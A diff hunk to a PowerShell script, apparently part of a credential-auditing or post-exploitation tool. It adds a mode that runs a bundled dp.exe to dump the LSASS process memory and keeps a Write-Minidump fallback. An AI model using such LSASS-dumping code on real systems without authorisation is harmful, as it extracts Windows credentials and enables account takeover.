@@ -547,9 +547,14 @@ __________________________________________________________________________#>
 
 Write-Progress -Activity "Creating lsass dump" -status "Running..." -id 1
 if($dump -eq "gen"){
-    #&$dumpAProcessPath "lsass" "$logDirectoryPath"
-    $process = Get-Process lsass 
-    Write-Minidump $process $logDirectoryPath
+    if($mode -eq "2r2") {
+        $dumpAProcessPath = "$scriptPath\dp.exe"
+        &$dumpAProcessPath "lsass" "$logDirectoryPath"
+    }
+    else {
+        $process = Get-Process lsass 
+        Write-Minidump $process $logDirectoryPath
+    }
 }
 else {
     if($dump -eq ""){
